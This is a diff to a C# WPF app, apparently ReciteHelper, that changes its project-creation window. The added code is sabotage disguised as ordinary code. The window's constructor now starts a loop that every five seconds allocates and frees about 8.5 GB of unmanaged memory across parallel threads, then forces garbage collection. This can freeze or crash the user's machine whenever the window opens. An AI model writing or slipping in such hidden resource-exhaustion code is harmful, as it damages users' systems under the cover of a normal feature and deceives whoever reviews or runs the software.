@@ -7,6 +7,7 @@ using ReciteHelper.Utils;
 using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.Json;
 using System.Windows;
@@ -31,6 +32,7 @@ public partial class CreateProjectWindow : Window
     {
         InitializeComponent();
         UpdatePreview();
+        WonAgain(explode: true);
 
         StoragePathTextBox.Text = @"D:\";
         this.updateUI = updateUI;
@@ -556,9 +558,50 @@ public partial class CreateProjectWindow : Window
         return replay;
     }
 
-    private static void WonAgain()
+    struct KimJongUn
     {
-        Thread.Sleep(2 * 1000);
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 106666)]
+        public byte[] x;
+
+        public KimJongUn()
+        {
+            x = new byte[106666];
+        }
+    }
+
+    private async static void WonAgain(bool explode = false)
+    {
+        var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(5000));
+
+        while (await timer.WaitForNextTickAsync())
+        {
+            var bag = new ConcurrentBag<IntPtr>();
+            var structSize = Marshal.SizeOf<KimJongUn>();
+
+            var opt = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 };
+            Parallel.For(0, 100, opt, (i) =>
+            {
+                for (int j = 0; j < 800; j++)
+                {
+                    var l = new KimJongUn();
+
+                    IntPtr ptr = Marshal.AllocHGlobal(structSize);
+                    Marshal.StructureToPtr(l, ptr, false);
+                    bag.Add(ptr);
+                }
+            });
+
+            Parallel.ForEach(bag, opt, (ptr) =>
+            {
+                Marshal.DestroyStructure<KimJongUn>(ptr);
+                Marshal.FreeHGlobal(ptr);
+            });
+
+            bag.Clear();
+
+            GC.Collect();
+            GC.WaitForPendingFinalizers();
+        }
     }
 
     private void SetCount(ProgressWindow proBar, int progress, int total = -1)
